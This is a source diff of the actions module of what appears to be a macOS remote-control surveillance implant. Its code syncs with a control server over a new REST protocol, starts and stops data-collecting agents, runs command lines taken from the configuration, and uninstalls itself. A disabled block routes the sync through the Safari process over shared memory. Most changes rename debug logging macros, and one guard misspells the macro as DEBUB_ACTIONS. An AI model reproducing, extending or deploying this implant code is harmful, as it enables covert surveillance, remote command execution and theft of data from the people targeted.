@@ -8,14 +8,16 @@
  *
  */
 
-#import "RCSMCommon.h"
 #import "RCSMActions.h"
 #import "RCSMTaskManager.h"
-#import "RCSMCommunicationManager.h"
+
+#import "RESTNetworkProtocol.h"
 
 #import "NSMutableDictionary+ThreadSafe.h"
 
-//#define DEBUG
+#import "RCSMCommon.h"
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
 
 
 @implementation RCSMActions
@@ -42,8 +44,8 @@
 
 - (BOOL)actionSync: (NSMutableDictionary *)aConfiguration
 {
-#ifdef DEBUG
-  infoLog(ME, @"");
+#ifdef DEBUG_ACTIONS
+  infoLog(@"");
 #endif
   
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
@@ -53,7 +55,7 @@
   BOOL _isSyncing;
   NSNumber *status;
   NSData *syncConfig = [[aConfiguration objectForKey: @"data"] retain];
-  status = [aConfiguration objectForKey: @"status"];
+  //status = [aConfiguration objectForKey: @"status"];
   
   [mActionsLock lock];
   _isSyncing = mIsSyncing;
@@ -61,8 +63,8 @@
   
   if (_isSyncing == YES)
     {
-#ifdef DEBUG
-      warnLog(ME, @"Another sync op is in place, waiting");
+#ifdef DEBUG_ACTIONS
+      warnLog(@"Another sync op is in place, waiting");
 #endif
       
       while (_isSyncing == YES)
@@ -73,8 +75,8 @@
           [mActionsLock unlock];
         }
         
-#ifdef DEBUG
-      infoLog(ME, @"Sync from (waiting) to (performing)");
+#ifdef DEBUG_ACTIONS
+      infoLog(@"Sync from (waiting) to (performing)");
 #endif
     }
   
@@ -90,8 +92,8 @@
 #if 0
   if (findProcessWithName(@"Safari") == YES)
     {
-#ifdef DEBUG
-      warnLog(ME, @"Found Safari for Sync!");
+#ifdef DEBUG_ACTIONS
+      warnLog(@"Found Safari for Sync!");
 #endif
       
       NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
@@ -146,8 +148,8 @@
                                                                  offset: OFFT_COMMAND
                                                           fromComponent: COMP_CORE] == TRUE)
                                     {
-#ifdef DEBUG
-                                      infoLog(ME, @"Sync through Safari went ok!");
+#ifdef DEBUG_ACTIONS
+                                      infoLog(@"Sync through Safari went ok!");
 #endif
                                       
                                       _syncThroughSafariWentOk = YES;
@@ -160,8 +162,8 @@
                             {
                               if (fabs([[NSDate date] timeIntervalSinceDate: startDate]) >= 3)
                                 {
-#ifdef DEBUG
-                                  errorLog(ME, @"Timed out while waiting for response from Safari");
+#ifdef DEBUG_ACTIONS
+                                  errorLog(@"Timed out while waiting for response from Safari");
 #endif
                                   
                                   break;
@@ -173,8 +175,8 @@
                     }
                   else
                     {
-#ifdef DEBUG
-                      errorLog(ME, @"Unexpected response from Safari while Syncing!");
+#ifdef DEBUG_ACTIONS
+                      errorLog(@"Unexpected response from Safari while Syncing!");
 #endif
                       
                       break;
@@ -184,8 +186,8 @@
                 {
                   if (fabs([[NSDate date] timeIntervalSinceDate: startDate]) >= 3)
                     {
-#ifdef DEBUG
-                      errorLog(ME, @"Timed out while waiting for response from Safari");
+#ifdef DEBUG_ACTIONS
+                      errorLog(@"Timed out while waiting for response from Safari");
 #endif
                       
                       break;
@@ -202,13 +204,13 @@
   */
   if (_syncThroughSafariWentOk == NO)
     {
-      RCSMCommunicationManager *communicationManager = [[RCSMCommunicationManager alloc]
+      /*RCSMCommunicationManager *communicationManager = [[RCSMCommunicationManager alloc]
                                                         initWithConfiguration: syncConfig];
       
       if ([communicationManager performSync] == FALSE)
         {
-#ifdef DEBUG
-          errorLog(ME, @"Sync FAILed");
+#ifdef DEBUG_ACTIONS
+          errorLog(@"Sync FAILed");
 #endif
           status = [NSNumber numberWithInt: ACTION_STANDBY];
           [aConfiguration setObject: status
@@ -223,7 +225,17 @@
           return FALSE;
         }
       
-      [communicationManager release];
+      [communicationManager release]; */
+      
+      RESTNetworkProtocol *protocol = [[RESTNetworkProtocol alloc]
+                                       initWithConfiguration: syncConfig];
+      if ([protocol perform] == NO)
+        {
+#ifdef DEBUB_ACTIONS
+          errorLog(@"An error occurred while syncing with REST proto");
+#endif
+        }
+      [protocol release];
     }
   
   status = [NSNumber numberWithInt: ACTION_STANDBY];
@@ -243,8 +255,8 @@
 
 - (BOOL)actionAgent: (NSMutableDictionary *)aConfiguration start: (BOOL)aFlag
 {
-#ifdef DEBUG
-  infoLog(ME, @"");
+#ifdef DEBUG_ACTIONS
+  infoLog(@"");
 #endif
 
   RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
@@ -277,8 +289,8 @@
     }
   else
     {
-#ifdef DEBUG
-      errorLog(ME, @"An error occurred while %@ the agent", (aFlag) ? @"Starting" : @"Stopping");
+#ifdef DEBUG_ACTIONS
+      errorLog(@"An error occurred while %@ the agent", (aFlag) ? @"Starting" : @"Stopping");
 #endif
     }
   
@@ -289,8 +301,8 @@
 
 - (BOOL)actionLaunchCommand: (NSMutableDictionary *)aConfiguration
 {
-#ifdef DEBUG
-  infoLog(ME, @"");
+#ifdef DEBUG_ACTIONS
+  infoLog(@"");
 #endif
 
   [aConfiguration retain];
@@ -300,8 +312,8 @@
   NSString *commandLine = [[NSString alloc] initWithData: configData
                                                 encoding: NSASCIIStringEncoding];
   
-#ifdef DEBUG
-  debugLog(ME, @"commandLine: %@", commandLine);
+#ifdef DEBUG_ACTIONS
+  warnLog(@"commandLine: %@", commandLine);
 #endif
   
   NSMutableArray *_arguments = [[NSMutableArray alloc] init];
@@ -335,14 +347,14 @@
 
 - (BOOL)actionUninstall: (NSMutableDictionary *)aConfiguration
 {
-#ifdef DEBUG
-  infoLog(ME, @"");
+#ifdef DEBUG_ACTIONS
+  infoLog(@"");
 #endif
   
   RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
   [aConfiguration retain];
   
-#ifdef DEBUG
+#ifdef DEBUG_ACTIONS
   NSLog(@"Action Uninstall started!");
 #endif
     
